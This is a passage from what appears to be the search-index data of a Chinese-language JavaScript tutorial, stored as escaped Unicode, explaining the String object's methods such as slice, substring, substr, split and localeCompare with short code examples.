\u62c6\u6210\u4e24\u4e2a\u5b57\u7b26\u8868\u793a\u3002 1 2 String . fromCharCode ( 0xD842 , 0xDFB7 ) // \"\ud842\udfb7\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 0x20BB7 \u62c6\u6210\u4e24\u4e2a\u5b57\u7b26 0xD842 \u548c 0xDFB7 \uff08\u5373\u4e24\u4e2a\u4e24\u5b57\u8282\u5b57\u7b26\uff0c\u5408\u6210\u4e00\u4e2a\u56db\u5b57\u8282\u5b57\u7b26\uff09\uff0c\u5c31\u80fd\u5f97\u5230\u6b63\u786e\u7684\u7ed3\u679c\u3002\u7801\u70b9\u5927\u4e8e 0xFFFF \u7684\u5b57\u7b26\u7684\u56db\u5b57\u8282\u8868\u793a\u6cd5\uff0c\u7531 UTF-16 \u7f16\u7801\u65b9\u6cd5\u51b3\u5b9a\u3002 \u5b9e\u4f8b\u5c5e\u6027 \u00b6 String.prototype.length \u00b6 \u5b57\u7b26\u4e32\u5b9e\u4f8b\u7684 length \u5c5e\u6027\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002 1 'abc' . length // 3 \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 String.prototype.charAt() \u00b6 charAt \u65b9\u6cd5\u8fd4\u56de\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u53c2\u6570\u662f\u4ece 0 \u5f00\u59cb\u7f16\u53f7\u7684\u4f4d\u7f6e\u3002 1 2 3 4 var s = new String ( 'abc' ); s . charAt ( 1 ) // \"b\" s . charAt ( s . length - 1 ) // \"c\" \u8fd9\u4e2a\u65b9\u6cd5\u5b8c\u5168\u53ef\u4ee5\u7528\u6570\u7ec4\u4e0b\u6807\u66ff\u4ee3\u3002 1 2 'abc' . charAt ( 1 ) // \"b\" 'abc' [ 1 ] // \"b\" \u5982\u679c\u53c2\u6570\u4e3a\u8d1f\u6570\uff0c\u6216\u5927\u4e8e\u7b49\u4e8e\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c charAt \u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 'abc' . charAt ( - 1 ) // \"\" 'abc' . charAt ( 3 ) // \"\" String.prototype.charCodeAt() \u00b6 charCodeAt() \u65b9\u6cd5\u8fd4\u56de\u5b57\u7b26\u4e32\u6307\u5b9a\u4f4d\u7f6e\u7684 Unicode \u7801\u70b9\uff08\u5341\u8fdb\u5236\u8868\u793a\uff09\uff0c\u76f8\u5f53\u4e8e String.fromCharCode() \u7684\u9006\u64cd\u4f5c\u3002 1 'abc' . charCodeAt ( 1 ) // 98 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c abc \u7684 1 \u53f7\u4f4d\u7f6e\u7684\u5b57\u7b26\u662f b \uff0c\u5b83\u7684 Unicode \u7801\u70b9\u662f 98 \u3002 \u5982\u679c\u6ca1\u6709\u4efb\u4f55\u53c2\u6570\uff0c charCodeAt \u8fd4\u56de\u9996\u5b57\u7b26\u7684 Unicode \u7801\u70b9\u3002 1 'abc' . charCodeAt () // 97 \u5982\u679c\u53c2\u6570\u4e3a\u8d1f\u6570\uff0c\u6216\u5927\u4e8e\u7b49\u4e8e\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c charCodeAt \u8fd4\u56de NaN \u3002 1 2 'abc' . charCodeAt ( - 1 ) // NaN 'abc' . charCodeAt ( 4 ) // NaN \u6ce8\u610f\uff0c charCodeAt \u65b9\u6cd5\u8fd4\u56de\u7684 Unicode \u7801\u70b9\u4e0d\u4f1a\u5927\u4e8e65536\uff080xFFFF\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u8fd4\u56de\u4e24\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u7684\u7801\u70b9\u3002\u5982\u679c\u9047\u5230\u7801\u70b9\u5927\u4e8e 65536 \u7684\u5b57\u7b26\uff08\u56db\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\uff09\uff0c\u5fc5\u987b\u8fde\u7eed\u4f7f\u7528\u4e24\u6b21 charCodeAt \uff0c\u4e0d\u4ec5\u8bfb\u5165 charCodeAt(i) \uff0c\u8fd8\u8981\u8bfb\u5165 charCodeAt(i+1) \uff0c\u5c06\u4e24\u4e2a\u503c\u653e\u5728\u4e00\u8d77\uff0c\u624d\u80fd\u5f97\u5230\u51c6\u786e\u7684\u5b57\u7b26\u3002 String.prototype.concat() \u00b6 concat \u65b9\u6cd5\u7528\u4e8e\u8fde\u63a5\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 var s1 = 'abc' ; var s2 = 'def' ; s1 . concat ( s2 ) // \"abcdef\" s1 // \"abc\" \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u53c2\u6570\u3002 1 'a' . concat ( 'b' , 'c' ) // \"abc\" \u5982\u679c\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c concat \u65b9\u6cd5\u4f1a\u5c06\u5176\u5148\u8f6c\u4e3a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u518d\u8fde\u63a5\u3002 1 2 3 4 5 6 var one = 1 ; var two = 2 ; var three = '3' ; '' . concat ( one , two , three ) // \"123\" one + two + three // \"33\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c concat \u65b9\u6cd5\u5c06\u53c2\u6570\u5148\u8f6c\u6210\u5b57\u7b26\u4e32\u518d\u8fde\u63a5\uff0c\u6240\u4ee5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u4e09\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\u3002\u4f5c\u4e3a\u5bf9\u6bd4\uff0c\u52a0\u53f7\u8fd0\u7b97\u7b26\u5728\u4e24\u4e2a\u8fd0\u7b97\u6570\u90fd\u662f\u6570\u503c\u65f6\uff0c\u4e0d\u4f1a\u8f6c\u6362\u7c7b\u578b\uff0c\u6240\u4ee5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u4e24\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\u3002 String.prototype.slice() \u00b6 slice() \u65b9\u6cd5\u7528\u4e8e\u4ece\u539f\u5b57\u7b26\u4e32\u53d6\u51fa\u5b50\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\u3002\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b50\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b50\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u4f4d\u7f6e\uff08\u4e0d\u542b\u8be5\u4f4d\u7f6e\uff09\u3002 1 'JavaScript' . slice ( 0 , 4 ) // \"Java\" \u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u4e00\u76f4\u5230\u539f\u5b57\u7b26\u4e32\u7ed3\u675f\u3002 1 'JavaScript' . slice ( 4 ) // \"Script\" \u5982\u679c\u53c2\u6570\u662f\u8d1f\u503c\uff0c\u8868\u793a\u4ece\u7ed3\u5c3e\u5f00\u59cb\u5012\u6570\u8ba1\u7b97\u7684\u4f4d\u7f6e\uff0c\u5373\u8be5\u8d1f\u503c\u52a0\u4e0a\u5b57\u7b26\u4e32\u957f\u5ea6\u3002 1 2 3 'JavaScript' . slice ( - 6 ) // \"Script\" 'JavaScript' . slice ( 0 , - 6 ) // \"Java\" 'JavaScript' . slice ( - 2 , - 1 ) // \"p\" \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u6b63\u6570\u60c5\u51b5\u4e0b\uff09\uff0c slice() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 1 'JavaScript' . slice ( 2 , 1 ) // \"\" String.prototype.substring() \u00b6 substring \u65b9\u6cd5\u7528\u4e8e\u4ece\u539f\u5b57\u7b26\u4e32\u53d6\u51fa\u5b50\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\uff0c\u8ddf slice \u65b9\u6cd5\u5f88\u76f8\u50cf\u3002\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u8868\u793a\u7ed3\u675f\u4f4d\u7f6e\uff08\u8fd4\u56de\u7ed3\u679c\u4e0d\u542b\u8be5\u4f4d\u7f6e\uff09\u3002 1 'JavaScript' . substring ( 0 , 4 ) // \"Java\" \u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u4e00\u76f4\u5230\u539f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u3002 1 'JavaScript' . substring ( 4 ) // \"Script\" \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c substring \u65b9\u6cd5\u4f1a\u81ea\u52a8\u66f4\u6362\u4e24\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u3002 1 2 3 'JavaScript' . substring ( 10 , 4 ) // \"Script\" // \u7b49\u540c\u4e8e 'JavaScript' . substring ( 4 , 10 ) // \"Script\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8c03\u6362 substring \u65b9\u6cd5\u7684\u4e24\u4e2a\u53c2\u6570\uff0c\u90fd\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002 \u5982\u679c\u53c2\u6570\u662f\u8d1f\u6570\uff0c substring \u65b9\u6cd5\u4f1a\u81ea\u52a8\u5c06\u8d1f\u6570\u8f6c\u4e3a0\u3002 1 2 'JavaScript' . substring ( - 3 ) // \"JavaScript\" 'JavaScript' . substring ( 4 , - 3 ) // \"Java\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684\u53c2\u6570 -3 \u4f1a\u81ea\u52a8\u53d8\u6210 0 \uff0c\u7b49\u540c\u4e8e 'JavaScript'.substring(4, 0) \u3002\u7531\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5c0f\u4e8e\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4f1a\u81ea\u52a8\u4e92\u6362\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8fd4\u56de Java \u3002 \u7531\u4e8e\u8fd9\u4e9b\u89c4\u5219\u8fdd\u53cd\u76f4\u89c9\uff0c\u56e0\u6b64\u4e0d\u5efa\u8bae\u4f7f\u7528 substring \u65b9\u6cd5\uff0c\u5e94\u8be5\u4f18\u5148\u4f7f\u7528 slice \u3002 String.prototype.substr() \u00b6 substr \u65b9\u6cd5\u7528\u4e8e\u4ece\u539f\u5b57\u7b26\u4e32\u53d6\u51fa\u5b50\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\uff0c\u8ddf slice \u548c substring \u65b9\u6cd5\u7684\u4f5c\u7528\u76f8\u540c\u3002 substr \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b50\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\u8ba1\u7b97\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b50\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002 1 'JavaScript' . substr ( 4 , 6 ) // \"Script\" \u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u4e00\u76f4\u5230\u539f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u3002 1 'JavaScript' . substr ( 4 ) // \"Script\" \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8d1f\u6570\uff0c\u8868\u793a\u5012\u6570\u8ba1\u7b97\u7684\u5b57\u7b26\u4f4d\u7f6e\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8d1f\u6570\uff0c\u5c06\u88ab\u81ea\u52a8\u8f6c\u4e3a0\uff0c\u56e0\u6b64\u4f1a\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 'JavaScript' . substr ( - 6 ) // \"Script\" 'JavaScript' . substr ( 4 , - 1 ) // \"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684\u53c2\u6570 -1 \u81ea\u52a8\u8f6c\u4e3a 0 \uff0c\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 0 \uff0c\u6240\u4ee5\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 String.prototype.indexOf()\uff0cString.prototype.lastIndexOf() \u00b6 indexOf \u65b9\u6cd5\u7528\u4e8e\u786e\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u7ed3\u679c\u662f\u5339\u914d\u5f00\u59cb\u7684\u4f4d\u7f6e\u3002\u5982\u679c\u8fd4\u56de -1 \uff0c\u5c31\u8868\u793a\u4e0d\u5339\u914d\u3002 1 2 'hello world' . indexOf ( 'o' ) // 4 'JavaScript' . indexOf ( 'script' ) // -1 indexOf \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u4ece\u8be5\u4f4d\u7f6e\u5f00\u59cb\u5411\u540e\u5339\u914d\u3002 1 'hello world' . indexOf ( 'o' , 6 ) // 7 lastIndexOf \u65b9\u6cd5\u7684\u7528\u6cd5\u8ddf indexOf \u65b9\u6cd5\u4e00\u81f4\uff0c\u4e3b\u8981\u7684\u533a\u522b\u662f lastIndexOf \u4ece\u5c3e\u90e8\u5f00\u59cb\u5339\u914d\uff0c indexOf \u5219\u662f\u4ece\u5934\u90e8\u5f00\u59cb\u5339\u914d\u3002 1 'hello world' . lastIndexOf ( 'o' ) // 7 \u53e6\u5916\uff0c lastIndexOf \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8868\u793a\u4ece\u8be5\u4f4d\u7f6e\u8d77\u5411\u524d\u5339\u914d\u3002 1 'hello world' . lastIndexOf ( 'o' , 6 ) // 4 String.prototype.trim() \u00b6 trim \u65b9\u6cd5\u7528\u4e8e\u53bb\u9664\u5b57\u7b26\u4e32\u4e24\u7aef\u7684\u7a7a\u683c\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\u3002 1 2 ' hello world ' . trim () // \"hello world\" \u8be5\u65b9\u6cd5\u53bb\u9664\u7684\u4e0d\u4ec5\u662f\u7a7a\u683c\uff0c\u8fd8\u5305\u62ec\u5236\u8868\u7b26\uff08 \\t \u3001 \\v \uff09\u3001\u6362\u884c\u7b26\uff08 \\n \uff09\u548c\u56de\u8f66\u7b26\uff08 \\r \uff09\u3002 1 '\\r\\nabc \\t' . trim () // 'abc' String.prototype.toLowerCase()\uff0cString.prototype.toUpperCase() \u00b6 toLowerCase \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5168\u90e8\u8f6c\u4e3a\u5c0f\u5199\uff0c toUpperCase \u5219\u662f\u5168\u90e8\u8f6c\u4e3a\u5927\u5199\u3002\u5b83\u4eec\u90fd\u8fd4\u56de\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 'Hello World' . toLowerCase () // \"hello world\" 'Hello World' . toUpperCase () // \"HELLO WORLD\" String.prototype.match() \u00b6 match \u65b9\u6cd5\u7528\u4e8e\u786e\u5b9a\u539f\u5b57\u7b26\u4e32\u662f\u5426\u5339\u914d\u67d0\u4e2a\u5b50\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u4e3a\u5339\u914d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u5982\u679c\u6ca1\u6709\u627e\u5230\u5339\u914d\uff0c\u5219\u8fd4\u56de null \u3002 1 2 'cat, bat, sat, fat' . match ( 'at' ) // [\"at\"] 'cat, bat, sat, fat' . match ( 'xt' ) // null \u8fd4\u56de\u7684\u6570\u7ec4\u8fd8\u6709 index \u5c5e\u6027\u548c input \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u5339\u914d\u5b57\u7b26\u4e32\u5f00\u59cb\u7684\u4f4d\u7f6e\u548c\u539f\u59cb\u5b57\u7b26\u4e32\u3002 1 2 3 var matches = 'cat, bat, sat, fat' . match ( 'at' ); matches . index // 1 matches . input // \"cat, bat, sat, fat\" match \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be6\u89c1\u300a\u6b63\u5219\u8868\u8fbe\u5f0f\u300b\u4e00\u7ae0\u3002 String.prototype.search()\uff0cString.prototype.replace() \u00b6 search \u65b9\u6cd5\u7684\u7528\u6cd5\u57fa\u672c\u7b49\u540c\u4e8e match \uff0c\u4f46\u662f\u8fd4\u56de\u503c\u4e3a\u5339\u914d\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u3002\u5982\u679c\u6ca1\u6709\u627e\u5230\u5339\u914d\uff0c\u5219\u8fd4\u56de -1 \u3002 1 'cat, bat, sat, fat' . search ( 'at' ) // 1 search \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be6\u89c1\u300a\u6b63\u5219\u8868\u8fbe\u5f0f\u300b\u4e00\u8282\u3002 replace \u65b9\u6cd5\u7528\u4e8e\u66ff\u6362\u5339\u914d\u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u53ea\u66ff\u6362\u7b2c\u4e00\u4e2a\u5339\u914d\uff08\u9664\u975e\u4f7f\u7528\u5e26\u6709 g \u4fee\u9970\u7b26\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff09\u3002 1 'aaa' . replace ( 'a' , 'b' ) // \"baa\" replace \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be6\u89c1\u300a\u6b63\u5219\u8868\u8fbe\u5f0f\u300b\u4e00\u8282\u3002 String.prototype.split() \u00b6 split \u65b9\u6cd5\u6309\u7167\u7ed9\u5b9a\u89c4\u5219\u5206\u5272\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u7531\u5206\u5272\u51fa\u6765\u7684\u5b50\u5b57\u7b26\u4e32\u7ec4\u6210\u7684\u6570\u7ec4\u3002 1 'a|b|c' . split ( '|' ) // [\"a\", \"b\", \"c\"] \u5982\u679c\u5206\u5272\u89c4\u5219\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u8fd4\u56de\u6570\u7ec4\u7684\u6210\u5458\u662f\u539f\u5b57\u7b26\u4e32\u7684\u6bcf\u4e00\u4e2a\u5b57\u7b26\u3002 1 'a|b|c' . split ( '' ) // [\"a\", \"|\", \"b\", \"|\", \"c\"] \u5982\u679c\u7701\u7565\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u6570\u7ec4\u7684\u552f\u4e00\u6210\u5458\u5c31\u662f\u539f\u5b57\u7b26\u4e32\u3002 1 'a|b|c' . split () // [\"a|b|c\"] \u5982\u679c\u6ee1\u8db3\u5206\u5272\u89c4\u5219\u7684\u4e24\u4e2a\u90e8\u5206\u7d27\u90bb\u7740\uff08\u5373\u4e24\u4e2a\u5206\u5272\u7b26\u4e2d\u95f4\u6ca1\u6709\u5176\u4ed6\u5b57\u7b26\uff09\uff0c\u5219\u8fd4\u56de\u6570\u7ec4\u4e4b\u4e2d\u4f1a\u6709\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 1 'a||c' . split ( '|' ) // ['a', '', 'c'] \u5982\u679c\u6ee1\u8db3\u5206\u5272\u89c4\u5219\u7684\u90e8\u5206\u5904\u4e8e\u5b57\u7b26\u4e32\u7684\u5f00\u5934\u6216\u7ed3\u5c3e\uff08\u5373\u5b83\u7684\u524d\u9762\u6216\u540e\u9762\u6ca1\u6709\u5176\u4ed6\u5b57\u7b26\uff09\uff0c\u5219\u8fd4\u56de\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6216\u6700\u540e\u4e00\u4e2a\u6210\u5458\u662f\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 '|b|c' . split ( '|' ) // [\"\", \"b\", \"c\"] 'a|b|' . split ( '|' ) // [\"a\", \"b\", \"\"] split \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u9650\u5b9a\u8fd4\u56de\u6570\u7ec4\u7684\u6700\u5927\u6210\u5458\u6570\u3002 1 2 3 4 5 'a|b|c' . split ( '|' , 0 ) // [] 'a|b|c' . split ( '|' , 1 ) // [\"a\"] 'a|b|c' . split ( '|' , 2 ) // [\"a\", \"b\"] 'a|b|c' . split ( '|' , 3 ) // [\"a\", \"b\", \"c\"] 'a|b|c' . split ( '|' , 4 ) // [\"a\", \"b\", \"c\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c split \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u51b3\u5b9a\u4e86\u8fd4\u56de\u6570\u7ec4\u7684\u6210\u5458\u6570\u3002 split \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be6\u89c1\u300a\u6b63\u5219\u8868\u8fbe\u5f0f\u300b\u4e00\u8282\u3002 String.prototype.localeCompare() \u00b6 localeCompare \u65b9\u6cd5\u7528\u4e8e\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u5982\u679c\u5c0f\u4e8e0\uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u5c0f\u4e8e\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\uff1b\u5982\u679c\u7b49\u4e8e0\uff0c\u8868\u793a\u4e24\u8005\u76f8\u7b49\uff1b\u5982\u679c\u5927\u4e8e0\uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\u3002 1 2 'apple' . localeCompare ( 'banana' ) // -1 'apple' . localeCompare ( 'apple' ) // 0 \u8be5\u65b9\u6cd5\u7684\u6700\u5927\u7279\u70b9\uff0c\u5c31\u662f\u4f1a\u8003\u8651\u81ea\u7136\u8bed\u8a00\u7684\u987a\u5e8f\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5927\u5199\u7684\u82f1\u6587\u5b57\u6bcd\u5c0f\u4e8e\u5c0f\u5199\u5b57\u6bcd\u3002 1 'B' > 'a' // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u6bcd B \u5c0f\u4e8e\u5b57\u6bcd a \u3002\u56e0\u4e3a JavaScript \u91c7\u7528\u7684\u662f Unicode \u7801\u70b9\u6bd4\u8f83\uff0c B \u7684\u7801\u70b9\u662f66\uff0c\u800c a \u7684\u7801\u70b9\u662f97\u3002 \u4f46\u662f\uff0c localeCompare \u65b9\u6cd5\u4f1a\u8003\u8651\u81ea\u7136\u8bed\u8a00\u7684\u6392\u5e8f\u60c5\u51b5\uff0c\u5c06 B \u6392\u5728 a \u7684\u524d\u9762\u3002 1 'B' . localeCompare ( 'a' ) // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c localeCompare \u65b9\u6cd5\u8fd4\u56de\u6574\u65701\uff0c\u8868\u793a B \u8f83\u5927\u3002 localeCompare \u8fd8\u53ef\u4ee5\u6709\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u6307\u5b9a\u6240\u4f7f\u7528\u7684\u8bed\u8a00\uff08\u9ed8\u8ba4\u662f\u82f1\u8bed\uff09\uff0c\u7136\u540e\u6839\u636e\u8be5\u8bed\u8a00\u7684\u89c4\u5219\u8fdb\u884c\u6bd4\u8f83\u3002 1 2 '\u00e4' . localeCompare ( 'z' , 'de' ) // -1 '\u00e4' . localeCompare ( 'z' , 'sv' ) // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c de \u8868\u793a\u5fb7\u8bed\uff0c sv \u8868\u793a\u745e\u5178\u8bed\u3002\u5fb7\u8bed\u4e2d\uff0c \u00e4 \u5c0f\u4e8e z \uff0c\u6240\u4ee5\u8fd4\u56de -1 \uff1b\u745e\u5178\u8bed\u4e2d\uff0c \u00e4 \u5927\u4e8e z \uff0c\u6240\u4ee5\u8fd4\u56de 1 \u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Ariya Hidayat, JavaScript String: substring, substr, slice","title":"String \u5bf9\u8c61"},{"location":"stdlib/string/#string","text":"","title":"String \u5bf9\u8c61"},{"location":"stdlib/string/#_1","text":"String \u5bf9\u8c61\u662f JavaScript \u539f\u751f\u63d0\u4f9b\u7684\u4e09\u4e2a\u5305\u88c5\u5bf9\u8c61\u4e4b\u4e00\uff0c\u7528\u6765\u751f\u6210\u5b57\u7b26\u4e32\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 var s1 = 'abc' ; var s2 = new String ( 'abc' ); typeof s1 // \"string\" typeof s2 // \"object\" s2 . valueOf () // \"abc\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf s1 \u662f\u5b57\u7b26\u4e32\uff0c s2 \u662f\u5bf9\u8c61\u3002\u7531\u4e8e s2 \u662f\u5b57\u7b26\u4e32\u5bf9\u8c61\uff0c s2.valueOf \u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u5b83\u6240\u5bf9\u5e94\u7684\u539f\u59cb\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u5bf9\u8c61\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08\u5f88\u50cf\u6570\u7ec4\uff0c\u4f46\u4e0d\u662f\u6570\u7ec4\uff09\u3002 1 2 3 4 new String ( 'abc' ) // String {0: \"a\", 1: \"b\", 2: \"c\", length: 3} ( new String ( 'abc' ))[ 1 ] // \"b\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 abc \u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5bf9\u8c61\uff0c\u6709\u6570\u503c\u952e\uff08 0 \u3001 1 \u3001 2 \uff09\u548c length \u5c5e\u6027\uff0c\u6240\u4ee5\u53ef\u4ee5\u50cf\u6570\u7ec4\u90a3\u6837\u53d6\u503c\u3002 \u9664\u4e86\u7528\u4f5c\u6784\u9020\u51fd\u6570\uff0c String \u5bf9\u8c61\u8fd8\u53ef\u4ee5\u5f53\u4f5c\u5de5\u5177\u65b9\u6cd5\u4f7f\u7528\uff0c\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 String ( true ) // \"true\" String ( 5 ) // \"5\" \u4e0a\u9762\u4ee3\u7801\u5c06\u5e03\u5c14\u503c true \u548c\u6570\u503c 5 \uff0c\u5206\u522b\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u3002","title":"\u6982\u8ff0"},{"location":"stdlib/string/#_2","text":"","title":"\u9759\u6001\u65b9\u6cd5"},{"location":"stdlib/string/#stringfromcharcode","text":"String \u5bf9\u8c61\u63d0\u4f9b\u7684\u9759\u6001\u65b9\u6cd5\uff08\u5373\u5b9a\u4e49\u5728\u5bf9\u8c61\u672c\u8eab\uff0c\u800c\u4e0d\u662f\u5b9a\u4e49\u5728\u5bf9\u8c61\u5b9e\u4f8b\u7684\u65b9\u6cd5\uff09\uff0c\u4e3b\u8981\u662f String.fromCharCode() 